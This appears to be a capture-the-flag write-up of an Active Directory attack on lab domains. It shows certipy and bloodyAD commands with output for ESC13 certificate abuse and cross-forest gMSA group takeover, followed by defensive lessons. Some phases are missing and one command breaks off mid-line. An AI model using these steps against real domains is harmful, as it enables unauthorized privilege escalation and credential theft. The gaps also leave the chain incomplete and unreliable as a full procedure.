Nmap also flagged a significant clock skew (roughly 8 hours ahead) between Kali and the DC:

Host script results:
|_clock-skew: 8h02m38s

Kerberos has a tight time tolerance, so every ticket-issuing command in this engagement needed to run under a faked clock. Set up /etc/hosts:

sudo sed -i "/ping.htb/d;/pong.htb/d" /etc/hosts
echo "<DC1_IP> dc1.ping.htb ping.htb" | sudo tee -a /etc/hosts
# DC2 IP will be added after discovery

Build libfaketime to transparently offset the clock for every Kerberos-aware command:

git clone --depth=1 https://github.com/wolfcw/libfaketime /tmp/libfaketime
make -C /tmp/libfaketime/src
cp /tmp/libfaketime/src/libfaketime.so.1 /tmp/libfaketime.so

Create a combined krb5.conf covering both realms and their capaths (needed for cross-forest ticket referrals later):

cat > /tmp/krb5_both.conf << 'EOF'
[libdefaults]
    default_realm = PING.HTB
    dns_canonicalize_hostname = false
    rdns = false
    forwardable = true
[realms]
    PING.HTB = { kdc = <DC1_IP>:88 }
    PONG.HTB = { kdc = 127.0.0.1:9088 }
[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB
[capaths]
    PING.HTB = { PONG.HTB = . }
    PONG.HTB = { PING.HTB = . }
EOF
Why this matteredClock skew is the silent killer of any Kerberos-heavy engagement — a wrapper like `libfaketime` applied consistently to every ticket-related command is far less error-prone than trying to `ntpdate` a box you don't control the time service on.

Phase 2 — ESC13: The Backdoor Certificate

ESC13 abuses a certificate template whose Issuance Policy OID maps to a specific AD group's SID. When the KDC processes a PKINIT logon with such a certificate, it resolves the OID and adds that group's SID into the resulting TGT's PAC — effectively granting group membership without ever adding the account to the group.

Get a TGT with the given credentials:

LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \
    impacket-getTGT 'PING.HTB/c.roberts:AssumedBreach123' -dc-ip <DC1_IP>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC
[*] Saving ticket in c.roberts.ccache

Request the ESC13-vulnerable certificate:

LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \
    certipy-ad req \
    -target dc1.ping.htb \
    -u 'c.roberts@ping.htb' \
    -k -no-pass \
    -ca 'PING-DC1-CA' \
    -template 'TemporaryWinRM' \
    -out c.roberts_esc13.pfx
Certipy v5.0.4 - by Oliver Lyak (ly4k)

That SID maps to the TempWinRMAccess group — the certificate itself now carries WinRM access without the account being a direct group member.

Phase 4 — Cross-Forest LDAP: The Trust Betrayal

Enumeration showed the PING.HTB IT group (which c.roberts belongs to) has ownership rights over the PONG.HTB gMSA Managers group via the forest trust — and that group has ReadGMSAPassword rights on Pong_gMSA$.

Grant GenericAll to c.roberts on the gMSA Managers group:

LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \
    KRB5CCNAME=/home/burrito/c.roberts.ccache \
    KRB5_CONFIG=/tmp/krb5_both.conf \
    bloodyAD -H dc2.pong.htb -d pong.htb \
    -u c.roberts -k ccache=/home/burrito/c.roberts.ccache \
    add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
    '<CERT_OBJECT_SID>'
[+] <CERT_OBJECT_SID> has now GenericAll on CN=gMSA Managers...

Group type conversion trick. Group membership scope restricts which changes are directly allowed — a Global security group can't jump straight to Domain Local. The fix is a two-step conversion: Global → Universal → Domain Local.

LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \
    bloodyAD -H dc2.pong.htb -d pong.htb \
    -u c.roberts -k ccache=/home/burrito/c.roberts.ccache \
    set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
    groupType -v -2147483640
[+] CN=gMSA Managers... groupType has been updated
LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \
    bloodyAD -H dc2.pong.htb -d pong.htb \

Lessons Learned

  1. Clock skew is the silent killer — an 8-hour offset breaks every Kerberos exchange; wrap every ticket command with libfaketime rather than fighting it one command at a time.
  2. NTLM-disabled environments are becoming the norm — every credential and every pivot in this chain had to go through Kerberos.
  3. Cross-forest trusts are attack surfaces, not just features — ownership of a group across a trust boundary is a direct escalation primitive.
  4. gMSA is not inherently safe — whoever controls "gMSA Managers" controls every service account that group can read.
  5. ESC13 is dangerous — a certificate can grant group membership without the account ever being added to the group.
  6. ESC4 → ESC1 is game over — modifying one template is enough to own the domain.
  7. Strong certificate mapping needs the SID — requests should always supply the target SID explicitly once ENROLLEE_SUPPLIES_SUBJECT is enabled.
